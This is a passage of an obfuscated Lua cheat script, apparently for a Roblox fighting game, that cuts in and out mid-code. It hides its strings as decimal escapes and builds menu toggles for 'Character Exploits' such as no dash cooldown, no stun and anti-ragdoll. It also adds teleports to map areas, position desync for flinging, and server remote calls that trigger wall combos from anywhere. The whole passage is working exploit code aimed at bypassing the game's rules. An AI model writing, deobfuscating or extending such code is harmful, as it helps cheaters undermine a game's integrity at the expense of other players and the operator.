 if (_IIIIlIIlll and _IIIIlIIlll.SeatPart and _IIIIlIIlll.SeatPart.Velocity.Magnitude <= 0x5) or ( not (_IIIIlIIlll and _IIIIlIIlll.SeatPart) or tick() >= _IlllIIlIII + 0x1) then break end
 end
 end
 , }) _IIIIlIIIll:AddSlider("\082\101\118\101\110\097\110\116\070\108\121\083\112\101\101\100", { Text = "\070\108\121\032\083\112\101\101\100", Default = 0x2710, Min = 0x1, Max = 0xC350, Rounding = 0x1, }) _IIIIlIIIll:AddDivider() table.insert(_llIlllIlIl, function () _IlIIlIllIl.Flying = false _lIlIIlIIll() pcall( function () _IIlIlIIlIl.RevenantFly:SetValue(false) end
 ) end
 ) end
 if _IllIlllllI[_lIIIlIIllI] then local _IlIlIIIlII = { ["\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\056\048\055\057\054\048\050\049"] = true, ["\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\056\048\055\057\051\057\054\050"] = true, } local _IlIlIIlIIl = nil local _lIIlIIlIII = {} _lIlllIlllI:AddToggle("\077\049\082\101\115\101\116", { Text = "\077\049\032\082\101\115\101\116\032\047\032\078\111\032\068\097\115\104\032\068\101\098\111\117\110\099\101", Default = false, }) _IlIlIIlIIl = RunService.Heartbeat:Connect( function () if not _IIlIlIIlIl.M1Reset or not _IIlIlIIlIl.M1Reset.Value then return end
 local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIlIIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIlIIlIl then return end
 for _lllIlllIIl, _llIIllIlIl in pairs(_IlIIlIIlIl:GetPlayingAnimationTracks()) do local _IlllIllIII = _llIIllIlIl.Animation and _llIIllIlIl.Animation.AnimationId or "" if _IlIlIIIlII[_IlllIllIII] and not _lIIlIIlIII[_llIIllIlIl] then _lIIlIIlIII[_llIIllIlIl] = true task.spawn( function () local _lIlIIlllII = _lIlIIlIlII.InputBegan:Once( function () while true do if _lIlIIlIlII:IsKeyDown(Enum.KeyCode.Q) and not _IIllllIlII:FindFirstChild("\082\097\103\100\111\108\108\067\097\110\099\101\108") then if _lIlIIlIlII:IsKeyDown(Enum.KeyCode.A) or (_lIlIIlIlII:IsKeyDown(Enum.KeyCode.D) or _lIlIIlIlII:IsKeyDown(Enum.KeyCode.S)) then if workspace:GetAttribute("\078\111\068\097\115\104\067\111\111\108\100\111\119\110") then _llIIllIlIl:Stop() local _llIlllIIll = _IIllllIlII local _IIIlIIIlIl, m1State, m1Index = pairs(_llIlllIIll:GetChildren()) while true do local _llllIlIllI m1Index, _llllIlIllI = _IIIlIIIlIl(m1State, m1Index) if m1Index == nil then break end
 if _llllIlIllI.Name == "\085\115\101\100\068\097\115\104" or _llllIlIllI.Name == "\070\114\101\101\122\101" then _llllIlIllI:Destroy() end
 end
 end
 else _IIllllIlII.Communicate:FireServer({ Dash = Enum.KeyCode.W, Key = Enum.KeyCode.Q, Goal = "\075\101\121\080\114\101\115\115", }) end
 break end
 RunService.RenderStepped:Wait() if not _llIIllIlIl.IsPlaying then break end
 end
 end
 ) task.delay(0x1, function () _lIlIIlllII:Disconnect() _lIIlIIlIII[_llIIllIlIl] = nil end
 ) end
 ) end
 end
 for _llIIllIlIl, _lllIlllIIl in pairs(_lIIlIIlIII) do if not _llIIllIlIl.IsPlaying then _lIIlIIlIII[_llIIllIlIl] = nil end
 end
 end
 ) table.insert(_llIlllIlIl, function () if _IlIlIIlIIl then _IlIlIIlIIl:Disconnect() _IlIlIIlIIl = nil end
 _lIIlIIlIII = {} pcall( function () _IIlIlIIlIl.M1Reset:SetValue(false) end
 ) end
 ) do local _IIllIllIlI = { "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\056\048\055\057\054\048\050\049", "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\056\048\055\057\051\057\054\050", "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\052\057\049\057\057\051\054\056\050", } _lIlllIlllI:AddToggle("\069\109\111\116\101\068\097\115\104", { Text = "\069\109\111\116\101\032\068\097\115\104", Default = false, }) local _llIIlIlllI = {} local function _IIllllIlll() local _IlllIlIIIl = _llIIIlIIll.PlayerGui:WaitForChild("\069\109\111\116\101\115", 0xF) if not _IlllIlIIIl then return end
 local _IIllIlIllI = _IlllIlIIIl:FindFirstChildWhichIsA("\073\109\097\103\101\076\097\098\101\108") if not _IIllIlIllI then local _lIlllIIIll = tick() + 0x5 repeat local _IIlIlIIIII = _IlllIlIIIl.ChildAdded:Wait() if _IIlIlIIIII:IsA("\073\109\097\103\101\076\097\098\101\108") then _IIllIlIllI = _IIlIlIIIII end
 until _IIllIlIllI or tick() > _lIlllIIIll end
 if not _IIllIlIllI then return end
 local function _IlIllIlllI(_IIlIlIIIII) local _lllllllIlI = _IIlIlIIIII:FindFirstChild("\066\117\116\116\111\110") if not (_IIlIlIIIII:IsA("\070\114\097\109\101") and tonumber(_IIlIlIIIII.Name) and _lllllllIlI) then return end
 local _IllIIIllII = _lllllllIlI.MouseButton1Click:Connect( function () if not _IIlIlIIlIl.EmoteDash.Value then return end
 local _IIllllIlII = _lIIIIIIllI(_llIIIlIIll) local _IlIIIlIIII = _IIllllIlII and getHumanoid(_IIllllIlII) if not (_IIllllIlII and _IlIIIlIIII) or _IIllllIlII:FindFirstChild("\070\114\101\101\122\101") then return end
 local _lIIlIIIlII, pingVal = pcall( function () return game:GetService("\083\116\097\116\115").Network.ServerStatsItem["\068\097\116\097\032\080\105\110\103"]:GetValue() / 0x3E8 end
 ) task.wait(_lIIlIIIlII and pingVal / 0x2 or 0x0) for _lllIlllIIl, _llIIllIlIl in pairs(_IlIIIlIIII:GetPlayingAnimationTracks()) do if table.find(_IIllIllIlI, _llIIllIlIl.Animation.AnimationId) then _llIIllIlIl:AdjustSpeed(0x63) end
 end
 end
 ) table.insert(_llIIlIlllI, _IllIIIllII) end
 for _lllIlllIIl, _IIlIlIIIII in pairs(_IIllIlIllI:GetChildren()) do _IlIllIlllI(_IIlIlIIIII) end
 local _IIIlIlllll = _IIllIlIllI.ChildAdded:Connect( function (_IIlIlIIIII) _IlIllIlllI(_IIlIlIIIII) end
 ) table.insert(_llIIlIlllI, _IIIlIlllll) end
 task.spawn(_IIllllIlll) _llIIIlIIll.CharacterAdded:Connect( function () for _lllIlllIIl, _IIIlIlllll in pairs(_llIIlIlllI) do _IIIlIlllll:Disconnect() end
 _llIIlIlllI = {} task.spawn(_IIllllIlll) end
 ) table.insert(_llIlllIlIl, function () for _lllIlllIIl, _IIIlIlllll in pairs(_llIIlIlllI) do _IIIlIlllll:Disconnect() end
 _llIIlIlllI = {} pcall( function () _IIlIlIIlIl.EmoteDash:SetValue(false) end
 ) end
 ) end
 end
 do local _llIIIIllll = nil local function _llIlIlIIIl() if _llIIIIllll then return end
 _llIIIIllll = RunService.Heartbeat:Connect( function () if not _IIlIlIIlIl.UltMirage or not _IIlIlIIlIl.UltMirage.Value then return end
 local _IIllllIlII = _llIIIlIIll.Character if not _IIllllIlII then return end
 local _IlIIIlIIII = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if not _IlIIIlIIII then return end
 if _IIllllIlII:FindFirstChild("\070\114\101\101\122\101") or _IIllllIlII:FindFirstChild("\065\110\116\105\077\111\118\101") then return end
 if _IIllllIlII:GetAttribute("\082\117\110\110\105\110\103") then _IlIIIlIIII.WalkSpeed = 0x20 end
 end
 ) end
 local function _llIlIlIIII() if _llIIIIllll then _llIIIIllll:Disconnect() _llIIIIllll = nil end
 end
 _lIlllIlllI:AddToggle("\085\108\116\077\105\114\097\103\101", { Text = "\085\108\116\032\077\105\114\097\103\101", Default = false, Callback = function (_lIllIlIIll) if _lIllIlIIll then _llIlIlIIIl() else _llIlIlIIII() end
 end
 , }) table.insert(_llIlllIlIl, function () _llIlIlIIII() pcall( function () _IIlIlIIlIl.UltMirage:SetValue(false) end
 ) end
 ) end
 if _IlllIlIllI and _lIlIlIllIl.Combat then _lIlllIlllI:AddDropdown("\067\104\097\114\097\099\116\101\114\069\120\112\108\111\105\116\115", { Values = { "\078\111\032\068\097\115\104\032\067\111\111\108\100\111\119\110", "\078\111\032\083\116\117\110", "\078\111\032\083\108\111\119", "\078\111\032\070\097\116\105\103\117\101", "\078\111\032\074\117\109\112\032\066\121\112\097\115\115", "\078\111\032\082\111\116\097\116\105\111\110\115\032\066\121\112\097\115\115", "\065\110\116\105\032\082\097\103\100\111\108\108", }, Default = {}, Multi = true, Searchable = false, Text = "\067\104\097\114\097\099\116\101\114\032\069\120\112\108\111\105\116\115", Callback = function (p517) workspace:SetAttribute("\078\111\068\097\115\104\067\111\111\108\100\111\119\110", false) workspace:SetAttribute("\078\111\070\097\116\105\103\117\101", false) if rawget(p517, "\078\111\032\068\097\115\104\032\067\111\111\108\100\111\119\110") then workspace:SetAttribute("\078\111\068\097\115\104\067\111\111\108\100\111\119\110", true) elseif rawget(p517, "\078\111\032\070\097\116\105\103\117\101") then workspace:SetAttribute("\078\111\070\097\116\105\103\117\101", true) elseif rawget(p517, "\078\111\032\082\111\116\097\116\105\111\110\115\032\066\121\112\097\115\115") then local _IIllllIlII = _llIIIlIIll.Character if _IIllllIlII then for _lllIlllIIl, inst in pairs(_IIllllIlII:GetDescendants()) do if inst.Name == "\078\111\082\111\116\097\116\101" or inst.Name == "\078\111\082\111\116\097\116\101\085\108\116\105\109\097\116\101" then pcall( function () inst:Destroy() end
 ) end
 end
 end
 end
 end
 , }) _lIlllIlllI:AddToggle("\065\117\116\111\082\097\103\100\111\108\108\067\097\110\099\101\108", { Text = "\065\117\116\111\032\082\097\103\100\111\108\108\032\067\097\110\099\101\108", Default = false, }) _lIlllIlllI:AddToggle("\082\097\103\100\111\108\108\072\105\100\101", { Text = "\082\097\103\100\111\108\108\032\072\105\100\101", Default = false, }) _lIlllIlllI:AddToggle("\076\097\117\110\099\104\072\105\100\101", { Text = "\076\097\117\110\099\104\032\072\105\100\101", Default = false, }) workspace:SetAttribute("\069\102\102\101\099\116\065\102\102\101\099\116\115", 0x1) local _IlIIIIlIIl = false workspace.AttributeChanged:Connect( function (p518) if _IlIIIIlIIl then return end
 _IlIIIIlIIl = true if p518 == "\078\111\068\097\115\104\067\111\111\108\100\111\119\110" then workspace:SetAttribute(p518, rawget(_IlIllIIllI.CharacterExploits.Value, "\078\111\032\068\097\115\104\032\067\111\111\108\100\111\119\110") and true or false) elseif p518 == "\078\111\070\097\116\105\103\117\101" then workspace:SetAttribute(p518, rawget(_IlIllIIllI.CharacterExploits.Value, "\078\111\032\070\097\116\105\103\117\101") and true or false) elseif p518 == "\069\102\102\101\099\116\115\065\102\102\101\099\116" then workspace:SetAttribute("\069\102\102\101\099\116\065\102\102\101\099\116\115", 0x1) end
 _IlIIIIlIIl = false end
 ) table.insert(_llIlllIlIl, function () pcall( function () _IlIllIIllI.CharacterExploits:SetValue({}) end
 ) pcall( function () _IIlIlIIlIl.AutoRagdollCancel:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.RagdollHide:SetValue(false) end
 ) pcall( function () _IIlIlIIlIl.LaunchHide:SetValue(false) end
 ) workspace:SetAttribute("\078\111\068\097\115\104\067\111\111\108\100\111\119\110", false) workspace:SetAttribute("\078\111\070\097\116\105\103\117\101", false) end
 ) end
 if _IlllIlIllI and _lIlIlIllIl.Combat then local _IlIllIllII = { ["\065\116\111\109\105\099\032\083\108\097\115\104"] = CFrame.new(-0x34, 0x62C, 0x62A2) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), Arena = CFrame.new(-0x82, 0x1B8, -0x175) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), Baseplate = CFrame.new(-0x2A, 0x73F, 0x628B) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\066\101\108\111\119\032\066\097\115\101\112\108\097\116\101"] = CFrame.new(-0x2A, 0x5BD, 0x628B) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), Jail = CFrame.new(0x1B8, 0x1B8, -0x18B) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\074\097\105\108\032\066\117\116\032\083\109\097\108\108\101\114"] = CFrame.new(0x14, 0x1B7, -0x1CC) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x122, 0x1B8, 0x1D1) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\069\118\101\110\032\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x17A, 0x1B7, 0x1C9) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\068\097\114\107\032\068\111\109\097\105\110"] = CFrame.new(-0x50, 0x54, 0x4FAB) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\068\101\097\116\104\032\067\111\117\110\116\101\114"] = CFrame.new(-0x42, 0x1D, 0x4F9F) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), Middle = CFrame.new(0x9B, 0x1B9, 0x2D) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\077\111\117\110\116\097\105\110\032\049"] = CFrame.new(0x132, 0x29F, 0x19B) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\077\111\117\110\116\097\105\110\032\050"] = CFrame.new(-0x1, 0x28D, -0x162) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), ["\077\111\117\110\116\097\105\110\032\069\100\103\101"] = CFrame.new(-0x129, 0x252, -0x150) * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), Void = CFrame.new(0xA9, 0xDA, 0x66) * CFrame.new(0x0, 1.5, 0x0) * CFrame.Angles(math.rad(0x5A), 0x0, 0x0), } local _lllIlIIlll = { ["\065\116\111\109\105\099\032\083\108\097\115\104"] = CFrame.new(-0x34, 0x62C, 0x62A2), Arena = CFrame.new(-0x82, 0x1B8, -0x175), Baseplate = CFrame.new(-0x2A, 0x73F, 0x628B), ["\066\101\108\111\119\032\066\097\115\101\112\108\097\116\101"] = CFrame.new(-0x2A, 0x5BD, 0x628B), Jail = CFrame.new(0x1B8, 0x1B8, -0x18B), ["\074\097\105\108\032\066\117\116\032\083\109\097\108\108\101\114"] = CFrame.new(0x14, 0x1B7, -0x1CC), ["\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x122, 0x1B8, 0x1D1), ["\069\118\101\110\032\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x17A, 0x1B7, 0x1C9), ["\068\097\114\107\032\068\111\109\097\105\110"] = CFrame.new(-0x50, 0x54, 0x4FAB), ["\068\101\097\116\104\032\067\111\117\110\116\101\114"] = CFrame.new(-0x42, 0x1D, 0x4F9F), Middle = CFrame.new(0x96, 0x1B9, 0x20), ["\077\111\117\110\116\097\105\110\032\049"] = CFrame.new(0x9, 0x28D, -0x16B), ["\077\111\117\110\116\097\105\110\032\050"] = CFrame.new(-0x1, 0x28D, -0x162), ["\077\111\117\110\116\097\105\110\032\069\100\103\101"] = CFrame.new(-0x129, 0x252, -0x150), Void = CFrame.new(0x0, -0x2710, 0x0), } local _IlIIIIIlIl = {} for _IIlIIllIlI in pairs(_IlIllIllII) do _IlIIIIIlIl[#_IlIIIIIlIl+0x1] = _IIlIIllIlI end
 table.sort(_IlIIIIIlIl) local _IlllIIlIIl = _lllIlIIlll.Middle local _IIlIIllIIl = false local _IllllIlllI = nil local function _llIIllIlll(_IIIIllllII) local _IIllllIlII = _llIIIlIIll.Character local _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IIllllIlII and _llIIlIIlII) then return end
 RunService.Heartbeat:Once( function () _llIIlIIlII.CFrame = _IIIIllllII end
 ) end
 local function _IIIIIlIllI(_IlIIlIIlIl, _IlllIllIII) local _llllIlIllI = Instance.new("\065\110\105\109\097\116\105\111\110") _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\048\048\057\051\051\053\055\056\056\057\057\048\052\050" local _llIIllIlIl = _IlIIlIIlIl:LoadAnimation(_llllIlIllI) _llllIlIllI.AnimationId = "\114\098\120\097\115\115\101\116\105\100\058\047\047" .. _IlllIllIII return _llIIllIlIl end
 local function _lIlllllIII() if getgenv()._wcDashOnCooldown then return true end
 if _IIlIlIIlIl.KibaTech and _IIlIlIIlIl.KibaTech.Value then return false end
 if _IIlIlIIlIl.SupaTech and _IIlIlIIlIl.SupaTech.Value then return false end
 if _IIlIlIIlIl.LoopDashV2 and _IIlIlIIlIl.LoopDashV2.Value then return false end
 if _IIlIlIIlIl.InstantTwisted and _IIlIlIIlIl.InstantTwisted.Value then local _lIlIIlIlIl = tostring(_llIIIlIIll:GetAttribute("\067\104\097\114\097\099\116\101\114") or ""):lower() if _lIlIIlIlIl:find("\103\097\114\111\117") or _lIlIIlIlIl:find("\104\117\110\116\101\114") or _lIlIIlIlIl:find("\099\104\105\108\100") then return false end
 end
 return true end
 local function _lIIllIllll(_IIllllIlII) if not _IIllllIlII then return end
 local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0x3) local _IlIIlIIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0x3) if not _llIIlIIlII or not _IlIIlIIlIl then return end
 _IIllllIlII.AttributeChanged:Connect( function (_IIIlIlIIlI) if _IIIlIlIIlI ~= "\067\111\109\098\111" then return end
 if _IIllllIlII:GetAttribute("\067\111\109\098\111") ~= 0x5 then return end
 if not _IIlIlIIlIl.WallComboAnywhere.Value then return end
 local _lllIIIlIII = _IlIllIIllI.AutoWallCombo.Value if _IIlIIllIIl then return end
 task.spawn( function () task.wait() local _lIlIIlIIlI = false pcall( function () for _lllIlllIIl, _IIlIIllIIl in pairs(_IlIIlIIlIl:GetPlayingAnimationTracks()) do if _IIlIIllIIl.Animation and _IIlIIllIIl.Animation.AnimationId:match("\049\048\052\055\048\049\048\052\050\052\050") then _lIlIIlIIlI = true break end
 end
 end
 ) local _IIllllIllI = false pcall( function () local _lIlIllllII = { "\049\048\052\054\057\054\052\051\054\052\051", "\049\051\050\057\052\052\055\049\057\054\054", "\049\055\056\056\057\050\057\048\053\054\057", "\049\051\050\057\053\057\051\054\056\054\054", "\049\051\051\055\056\055\048\056\049\057\057", "\049\052\049\051\054\052\051\054\049\053\055", "\049\053\049\054\050\054\057\052\049\057\050", "\049\054\053\053\050\050\051\052\053\057\048", "\049\055\051\050\053\053\051\055\055\049\057", "\049\051\052\055\055\053\052\048\054\052\051\055\054\050\054", "\056\048\054\048\049\050\051\057\049\051\057\055\055\052", } for _lllIlllIIl, _IIlIIllIIl in pairs(_IlIIlIIlIl:GetPlayingAnimationTracks()) do if _IIlIIllIIl.Animation then local _IIIIllIIlI = _IIlIIllIIl.Animation.AnimationId:match("\037\100\043") or "" for _lllIlllIIl, m4id in ipairs(_lIlIllllII) do if _IIIIllIIlI == m4id then _IIllllIllI = true; break end
 end
 end
 if _IIllllIllI then break end
 end
 end
 ) if _IIllllIllI then local _llIlIlIIlI = tostring(_llIIIlIIll:GetAttribute("\067\104\097\114\097\099\116\101\114") or ""):lower() local _lIlllIlllI = _llIlIlIIlI:find("\103\097\114\111\117") or _llIlIlIIlI:find("\104\117\110\116\101\114") or _llIlIlIIlI:find("\109\111\110\115\116\101\114") or _llIlIlIIlI:find("\099\104\105\108\100") or _llIlIlIIlI:find("\116\101\099\104") if _lIlllIlllI and _IIlIlIIlIl.InstantTwisted and _IIlIlIIlIl.InstantTwisted.Value then _IIllllIllI = false end
 end
 if not _lIlIIlIIlI and not _IIllllIllI and not _lIlllllIII() then return end
 if _lllIIIlIII == "\065\117\116\111\032\087\097\108\108\032\067\111\109\098\111\032\043\032\066\114\105\110\103" then _IIlIIllIIl = true local _IIlIIllIIl = tick() repeat getgenv().flingDesync = { CFrame = _llIIlIIlII.CFrame * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), } task.wait() until tick() >= _IIlIIllIIl + 0.225 local _IIIIllIlIl = _llIIlIIlII.CFrame getgenv().flingDesync = { CFrame = _IlIllIllII[_IlIllIIllI.AutoWallComboArea.Value], } task.wait(0.2) pcall( function () _IIllllIlII.Communicate:FireServer({ Goal = "\087\097\108\108\032\067\111\109\098\111" }) end
 ) getgenv().flingDesync = nil _IIlIIllIIl = false task.wait(0.5) if _IIllllIlII:FindFirstChild("\070\111\114\099\101\070\105\101\108\100") and _IIlIlIIlIl.AutoWallComboTPBack.Value then pcall( function () for _lllIlllIIl, _llIIllIlIl in pairs(_IlIIlIIlIl:GetPlayingAnimationTracks()) do _llIIllIlIl:Stop() end
 end
 ) _llIIllIlll(_IIIIllIlIl) end
 else _IIlIIllIIl = true local _IIIlIIIIlI = nil if not getgenv().InvisActive and not getgenv().FUCActive then local _llIIllIlIl = _IIIIIlIllI(_IlIIlIIlIl, "\049\056\049\053\050\053\053\052\054") _llIIllIlIl.Priority = Enum.AnimationPriority.Action3 task.delay(0.1, function () _llIIllIlIl:Play() _llIIllIlIl.TimePosition = 0x1 _llIIllIlIl:AdjustWeight(0xF423F) _llIIllIlIl:AdjustSpeed(0x0) end
 ) _IIIlIIIIlI = _llIIllIlIl end
 local _IIlIIllIIl = tick() repeat getgenv().flingDesync = { CFrame = _llIIlIIlII.CFrame * CFrame.new(0x0, -0.5, 0x0) * CFrame.Angles(math.rad(-0x5A), 0x0, 0x0), } task.wait() until tick() >= _IIlIIllIIl + 0.6 getgenv().flingDesync = nil _IIlIIllIIl = false task.delay(0.1, function () if _IIIlIIIIlI then pcall( function () _IIIlIIIIlI:Stop() end
 ) end
 end
 ) end
 end
 ) end
 ) _IIllllIlII.DescendantAdded:Connect( function (obj) if not (obj:IsA("\079\098\106\101\099\116\086\097\108\117\101") and obj.Name:lower() == "\119\097\108\108\099\111\109\098\111") then return end
 if not _IIlIlIIlIl.WallComboAnywhere.Value then return end
 local _lllllllIlI = tick() while true do if _IlIllIIllI.AutoWallCombo.Value == "\065\117\116\111\032\087\097\108\108\032\067\111\109\098\111" then pcall( function () _IIllllIlII.Communicate:FireServer({ Goal = "\087\097\108\108\032\067\111\109\098\111" }) end
 ) end
 task.wait() if obj.Parent ~= _IIllllIlII or tick() >= _lllllllIlI + (obj:GetAttribute("\068\101\108\101\116\101\077\101") or 0.6) then break end
 end
 end
 ) end
 _lIIllIllll(_llIIIlIIll.Character) _IllllIlllI = _llIIIlIIll.CharacterAdded:Connect( function (_IIllllIlII) task.wait(0.1) _lIIllIllll(_IIllllIlII) end
 ) table.insert(_llIlllIlIl, function () getgenv().flingDesync = nil _IIlIIllIIl = false if _IllllIlllI then _IllllIlllI:Disconnect() _IllllIlllI = nil end
 pcall( function () _IIlIlIIlIl.WallComboAnywhere:SetValue(false) end
 ) pcall( function () _IlIllIIllI.AutoWallCombo:SetValue("\077\097\110\117\097\108") end
 ) pcall( function () _IIlIlIIlIl.AutoWallComboTPBack:SetValue(false) end
 ) end
 ) local _IllIlIIlll = _lIlIIllIIl _IllIlIIlll:AddToggle("\087\097\108\108\067\111\109\098\111\065\110\121\119\104\101\114\101", { Text = "\087\097\108\108\032\067\111\109\098\111\032\065\110\121\119\104\101\114\101", Default = false, }) _IllIlIIlll:AddDropdown("\065\117\116\111\087\097\108\108\067\111\109\098\111", { Text = "\065\117\116\111\032\087\097\108\108\032\067\111\109\098\111", Values = { "\077\097\110\117\097\108", "\065\117\116\111\032\087\097\108\108\032\067\111\109\098\111", "\065\117\116\111\032\087\097\108\108\032\067\111\109\098\111\032\043\032\066\114\105\110\103" }, Multi = false, Default = 0x1, }) _IllIlIIlll:AddToggle("\065\117\116\111\087\097\108\108\067\111\109\098\111\084\080\066\097\099\107", { Text = "\084\101\108\101\112\111\114\116\032\066\097\099\107", Default = false, }) _IllIlIIlll:AddDropdown("\065\117\116\111\087\097\108\108\067\111\109\098\111\065\114\101\097", { Text = "\065\114\101\097", Values = _IlIIIIIlIl, Multi = false, Default = table.find(_IlIIIIIlIl, "\068\101\097\116\104\032\067\111\117\110\116\101\114"), Searchable = true, }) _IllIlIIlll:AddButton({ Text = "\084\101\108\101\112\111\114\116\032\084\111\032\065\114\101\097", Func = function () local _IIIIllllII = _lllIlIIlll[_IlIllIIllI.AutoWallComboArea.Value] if not _IIIIllllII then return end
 local _IIllllIlII = _llIIIlIIll.Character local _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IIllllIlII and _llIIlIIlII then local _IIIlllIlIl = (_lllIlIIlll.Middle.Position - _IIIIllllII.Position).Magnitude if _IIIlllIlIl >= 0x64 then _IlllIIlIIl = _llIIlIIlII.CFrame end
 end
 _llIIllIlll(_IIIIllllII) end
 , }) _IllIlIIlll:AddButton({ Text = "\084\101\108\101\112\111\114\116\032\066\097\099\107", Func = function () _llIIllIlll(_IlllIIlIIl) end
 , }) end
 if _IllIlllllI[_lIIIlIIllI] then local _lIIlllIIlI = _IlllIllIll _lIIlllIIlI:AddToggle("\084\114\097\115\104\099\097\110\076\097\117\110\099\104", { Text = "\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104", Default = false, }) _lIIlllIIlI:AddSlider("\084\114\097\115\104\099\097\110\095\076\097\117\110\099\104\080\111\119\101\114", { Text = "\076\097\117\110\099\104\032\080\111\119\101\114", Default = 0x64, Min = 0x1, Max = 0x9C4, Rounding = 0x1, Compact = true, }) end
 if _IllIlllllI[_lIIIlIIllI] and _lIlIlIllIl.Combat then local _IIIllIIlIl = { ["\065\098\111\118\101\032\084\117\110\110\101\108"] = CFrame.new(-0x12D, 0x252, -0x142), Arena = CFrame.new(-0x82, 0x1B8, -0x175), ["\065\116\111\109\105\099\032\083\108\097\115\104"] = CFrame.new(-0x34, 0x62C, 0x62A2), Baseplate = CFrame.new(-0x2A, 0x73F, 0x628B), ["\066\101\108\111\119\032\066\097\115\101\112\108\097\116\101"] = CFrame.new(-0x2A, 0x5BD, 0x628B), ["\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x122, 0x1B8, 0x1D1), ["\066\108\097\099\107\032\068\111\109\097\105\110"] = CFrame.new(0xE8D4A51000, 0x5F5E100, 0x174876E800), ["\069\118\101\110\032\066\105\103\103\101\114\032\074\097\105\108"] = CFrame.new(0x17A, 0x1B7, 0x1C9), ["\068\097\114\107\032\068\111\109\097\105\110"] = CFrame.new(-0x50, 0x54, 0x4FAB), ["\068\101\097\116\104\032\067\111\117\110\116\101\114"] = CFrame.new(-0x42, 0x1D, 0x4F9F), Jail = CFrame.new(0x1B8, 0x1B8, -0x18B), ["\074\097\105\108\032\066\117\116\032\083\109\097\108\108\101\114"] = CFrame.new(0x14, 0x1B7, -0x1CC), Middle = CFrame.new(0x96, 0x1B9, 0x20), ["\077\111\117\110\116\097\105\110\032\049"] = CFrame.new(0x132, 0x29F, 0x19B), ["\077\111\117\110\116\097\105\110\032\050"] = CFrame.new(-0x1, 0x28D, -0x162), ["\077\111\117\110\116\097\105\110\032\069\100\103\101"] = CFrame.new(-0x129, 0x252, -0x150), Void = CFrame.new(0x0, -0x2710, 0x0), } local _lIIllIIlIl = {} for _IIlIIllIlI in pairs(_IIIllIIlIl) do _lIIllIIlIl[#_lIIllIIlIl+0x1] = _IIlIIllIlI end
 table.sort(_lIIllIIlIl) local _IIIlIlllll = _IIIllIIlIl.Middle local _IIllIllIlI = nil local _IIIIIllIll = false local function _llIllllllI(_IIIIllllII) local _IIllllIlII = _llIIIlIIll.Character local _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if not (_IIllllIlII and _llIIlIIlII) then return end
 RunService.Heartbeat:Once( function () _llIIlIIlII.CFrame = _IIIIllllII end
 ) end
 local function _IIlllIlIIl(_IIllllIlII) if not _IIllllIlII then return end
 local _IlIIlIIlIl = _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100", 0x3) local _llIIlIIlII = _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") or _IIllllIlII:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116", 0x3) if not _IlIIlIIlIl or not _llIIlIIlII then return end
 _IlIIlIIlIl.AnimationPlayed:Connect( function (_llIIllIlIl) if not _IIlIlIIlIl.SkillBring.Value then return end
